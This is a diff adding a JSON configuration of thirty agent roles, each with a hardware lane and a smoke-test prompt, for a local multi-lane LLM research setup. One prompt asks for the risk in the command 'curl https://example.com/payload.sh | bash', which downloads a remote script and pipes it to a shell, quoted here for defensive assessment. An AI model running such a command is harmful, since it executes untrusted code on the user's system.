@@ -1,0 +1,269 @@
+{
+  "version": "1.2-E88b",
+  "agents": [
+    {
+      "name": "autonomous_decision",
+      "mission": "Pick best option from a constrained set under uncertainty",
+      "task_class": "numeric_judgment",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Given two experiment proposals A=cross-correlation B=parameter-sweep, which would more likely yield novel findings? Reply ONLY 'A' or 'B'.",
+      "max_tokens": 12
+    },
+    {
+      "name": "planning",
+      "mission": "Break a goal into ordered steps with dependencies",
+      "task_class": "long_reasoning",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Plan 4 steps to add cross-experiment correlation tracking to an existing autoresearch loop. Number them 1-4, one line each.",
+      "max_tokens": 220,
+      "lane_assignment_rationale": "E85 finding: NPU recovers 100% of iGPU abstentions on long_reasoning"
+    },
+    {
+      "name": "memory_augmented",
+      "mission": "Retrieve relevant prior observations and answer with context",
+      "task_class": "structured_recall",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Given prior finding 'CPU lane wins paper-scoring at 250 tok/s vs iGPU 42', which lane should score the next 100 papers? Answer in one sentence.",
+      "max_tokens": 80,
+      "lane_assignment_rationale": "E88b: structured_recall also abstains on iGPU per E87 dogfood; route to NPU"
+    },
+    {
+      "name": "knowledge_retrieval",
+      "mission": "Surface the most relevant fact for a question",
+      "task_class": "paper_scoring",
+      "preferred_lane": "cpu",
+      "smoke_prompt": "What does L369 in cohezion's CLAUDE.md describe? Answer in 12 words or fewer.",
+      "max_tokens": 40
+    },
+    {
+      "name": "document_intelligence",
+      "mission": "Extract the key claim from a passage",
+      "task_class": "long_reasoning",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Summarize this in one sentence: 'GEPA evolves prompts via reflective LLM mutation over execution traces with Pareto selection \u2014 outperforms RL baselines.'",
+      "max_tokens": 80,
+      "lane_assignment_rationale": "E85 finding: NPU recovers 100% of iGPU abstentions on long_reasoning"
+    },
+    {
+      "name": "scientific_research",
+      "mission": "Propose a falsifiable hypothesis for a phenomenon",
+      "task_class": "long_reasoning",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Hypothesis: why does CPU(0.6B) beat iGPU(4B) on 180-token JSON outputs at 5x throughput? Output ONLY: 'Hypothesis: <one sentence>'.",
+      "max_tokens": 120,
+      "lane_assignment_rationale": "E85 finding: NPU recovers 100% of iGPU abstentions on long_reasoning"
+    },
+    {
+      "name": "tool_using",
+      "mission": "Select the best tool for a task from a known set",
+      "task_class": "numeric_judgment",
+      "preferred_lane": "npu",
+      "smoke_prompt": "To compute Pearson correlation across 8000 rows, pick: A=numpy B=loop. Reply ONLY 'A' or 'B'.",
+      "max_tokens": 12
+    },
+    {
+      "name": "agentic_workflow",
+      "mission": "Compose multi-step workflows of agent calls",
+      "task_class": "long_reasoning",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Compose a 3-step workflow: 1) fetch arXiv papers 2) score by ensemble 3) persist to vault. Output JSON: {\"steps\":[...]}.",
+      "max_tokens": 180,
+      "lane_assignment_rationale": "E85 finding: NPU recovers 100% of iGPU abstentions on long_reasoning"
+    },
+    {
+      "name": "data_analysis",
+      "mission": "Find statistical patterns in tabular data",
+      "task_class": "long_reasoning",
+      "preferred_lane": "npu",
+      "smoke_prompt": "10 keep-rate values [.6,.61,.6,.62,.6,.61,.6,.62,.6,.61] \u2014 describe in one sentence (trend? flat? noisy?).",
+      "max_tokens": 60,
+      "lane_assignment_rationale": "E85 finding: NPU recovers 100% of iGPU abstentions on long_reasoning"
+    },
+    {
+      "name": "verification_validation",
+      "mission": "Verify a claim against evidence",
+      "task_class": "numeric_judgment",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Claim: 'CPU lane achieved 250 tok/s on 0.6B model'. Plausible on AMD Ryzen AI MAX+ 395? Reply ONLY 'plausible' or 'implausible'.",
+      "max_tokens": 12
+    },
+    {
+      "name": "general_problem_solver",
+      "mission": "Reason from first principles to a solution",
+      "task_class": "long_reasoning",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Why might a research loop produce 17K experiments but only 50 vault discoveries? One sentence.",
+      "max_tokens": 80,
+      "lane_assignment_rationale": "E85 finding: NPU recovers 100% of iGPU abstentions on long_reasoning"
+    },
+    {
+      "name": "code_generation",
+      "mission": "Generate runnable code from a spec",
+      "task_class": "code",
+      "preferred_lane": "igpu",
+      "smoke_prompt": "Write a Python one-liner that sums squares of integers 1-10. Just the code, nothing else.",
+      "max_tokens": 60
+    },
+    {
+      "name": "security_hardened",
+      "mission": "Identify abuse / leak / injection risks",
+      "task_class": "structured_recall",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Risk in 'curl https://example.com/payload.sh | bash'? One short sentence.",
+      "max_tokens": 60,
+      "lane_assignment_rationale": "E88b: structured_recall also abstains on iGPU per E87 dogfood; route to NPU"
+    },
+    {
+      "name": "self_improving",
+      "mission": "Critique own prior output and propose an improvement",
+      "task_class": "long_reasoning",
+      "preferred_lane": "ensemble",
+      "smoke_prompt": "Critique: an autoresearch loop that fires 1733 cycles but recycles 2 recommendations forever. One concrete fix.",
+      "max_tokens": 120
+    },
+    {
+      "name": "conversational",
+      "mission": "Maintain coherent multi-turn dialogue",
+      "task_class": "long_reasoning",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Reply briefly: 'How are the silicon lanes performing today?' \u2014 Lemonade @ 13307, NPU+iGPU+CPU all 100% success.",
+      "max_tokens": 60,
+      "lane_assignment_rationale": "E85 finding: NPU recovers 100% of iGPU abstentions on long_reasoning"
+    },
+    {
+      "name": "content_creation",
+      "mission": "Draft new long-form content",
+      "task_class": "long_reasoning",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Write a 2-line abstract for: 'silicon council aggregates NPU+iGPU+CPU verdicts via confidence-weighted vote'.",
+      "max_tokens": 100,
+      "lane_assignment_rationale": "E85 finding: NPU recovers 100% of iGPU abstentions on long_reasoning"
+    },
+    {
+      "name": "recommendation",
+      "mission": "Recommend an item from a candidate pool",
+      "task_class": "numeric_judgment",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Best candidate to fine-tune locally: A=Llama-3.1-8B B=gpt-oss-20b? Reply ONLY 'A' or 'B'.",
+      "max_tokens": 12
+    },
+    {
+      "name": "vision_language",
+      "mission": "Reason about images + text together",
+      "task_class": "vision_text",
+      "preferred_lane": "reserved",
+      "smoke_prompt": "(reserved \u2014 no VLM loaded; would normally call ThinkJEPA / Gemma-3-4B-vision)",
+      "max_tokens": 0,
+      "reserved_reason": "no VLM loaded \u2014 V-JEPA 2 / ThinkJEPA candidate"
+    },
+    {
+      "name": "audio_processing",
+      "mission": "Transcribe speech / synthesize speech",
+      "task_class": "audio",
+      "preferred_lane": "reserved",
+      "smoke_prompt": "(reserved \u2014 kokoro-v1 TTS available but no ASR; whisper.cpp candidate)",
+      "max_tokens": 0,
+      "reserved_reason": "kokoro-v1 TTS exists but no ASR loaded"
+    },
+    {
+      "name": "physical_world_sensing",
+      "mission": "Reason about real-time sensor data",
+      "task_class": "robotics",
+      "preferred_lane": "reserved",
+      "smoke_prompt": "(reserved \u2014 V-JEPA 2-AC action-conditioned planner candidate)",
+      "max_tokens": 0,
+      "reserved_reason": "V-JEPA 2-AC ideal candidate; no sensor adapter wired"
+    },
+    {
+      "name": "ethical_reasoning",
+      "mission": "Surface ethical concerns in a plan",
+      "task_class": "structured_recall",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Ethical concern with auto-downloading 8B model weights without user confirmation? One short sentence.",
+      "max_tokens": 60,
+      "lane_assignment_rationale": "E88b: structured_recall also abstains on iGPU per E87 dogfood; route to NPU"
+    },
+    {
+      "name": "explainable",
+      "mission": "Explain why a prior decision was made",
+      "task_class": "long_reasoning",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Why was Llama-3.1-8B chosen over gpt-oss-20b on Strix Halo? One sentence (hint: hardware fit).",
+      "max_tokens": 60,
+      "lane_assignment_rationale": "E85 finding: NPU recovers 100% of iGPU abstentions on long_reasoning"
+    },
+    {
+      "name": "healthcare_intelligence",
+      "mission": "Reason about clinical/biomedical data",
+      "task_class": "domain_specialist",
+      "preferred_lane": "igpu",
+      "smoke_prompt": "What kind of evidence would justify proposing a clinical trial? One sentence (general, not specific).",
+      "max_tokens": 80
+    },
+    {
+      "name": "scientific_discovery",
+      "mission": "Surface a discoverable pattern in evidence",
+      "task_class": "long_reasoning",
+      "preferred_lane": "ensemble",
+      "smoke_prompt": "Pattern: 239 experiments at 100% HIHO consensus, 0 below 20%. What's the pattern? One sentence.",
+      "max_tokens": 80
+    },
+    {
+      "name": "financial_advisory",
+      "mission": "Reason about cost/benefit tradeoffs",
+      "task_class": "domain_specialist",
+      "preferred_lane": "igpu",
+      "smoke_prompt": "Tradeoff: $0/mo Lemonade local vs $20/mo Ollama cloud \u2014 one factor that matters most? One sentence.",
+      "max_tokens": 60
+    },
+    {
+      "name": "legal_intelligence",
+      "mission": "Reason about license / IP / compliance",
+      "task_class": "domain_specialist",
+      "preferred_lane": "igpu",
+      "smoke_prompt": "Can a model with 'apache-2.0' license be used commercially? One word: yes/no.",
+      "max_tokens": 12
+    },
+    {
+      "name": "education_intelligence",
+      "mission": "Tailor explanations to a learner's level",
+      "task_class": "long_reasoning",
+      "preferred_lane": "npu",
+      "smoke_prompt": "Explain 'silicon council' in one sentence to someone who knows Python but not LLMs.",
+      "max_tokens": 60,
+      "lane_assignment_rationale": "E85 finding: NPU recovers 100% of iGPU abstentions on long_reasoning"
+    },
+    {
+      "name": "collective_intelligence",
+      "mission": "Aggregate multiple voices into a single decision",
+      "task_class": "ensemble_aggregate",
+      "preferred_lane": "ensemble",
+      "smoke_prompt": "Three lanes voted: NPU=keep, iGPU=keep, CPU=discard. Final decision (1 word)?",
+      "max_tokens": 12
+    },
+    {
+      "name": "embodied_intelligence",
+      "mission": "Map plans to physical actions",
+      "task_class": "robotics",
+      "preferred_lane": "reserved",
+      "smoke_prompt": "(reserved \u2014 V-JEPA 2-AC zero-shot manipulation candidate)",
+      "max_tokens": 0,
+      "reserved_reason": "no robot/sim adapter; V-JEPA 2-AC + Franka would be next"
+    },
+    {
+      "name": "domain_transforming",
+      "mission": "Translate a finding from one domain to another",
+      "task_class": "long_reasoning",
+      "preferred_lane": "ensemble",
+      "smoke_prompt": "Translate the JEPA world-model pattern into autoresearch terms in one sentence.",
+      "max_tokens": 80
+    }
+  ],
+  "lane_routing": {
+    "npu": "gemma3-4b-FLM",
+    "igpu": "Gemma-4-E4B-it-GGUF",
+    "cpu": "Qwen3-0.6B-GGUF"
+  },
+  "saved_at": "2026-05-03T04:09:18Z",
+  "notes": "E84 found 17/30 agents abstained on iGPU (L369). E85 ensemble retry recovered 100% of those via NPU. Dispatcher updated: long_reasoning -> NPU primary, iGPU reserved for code_generation only. Coverage: 22/30 silicon-backed, 4 reserved (vision/audio/embodied \u2014 need V-JEPA 2 / VLM / ASR model loads), 4 ensemble-only."
+}
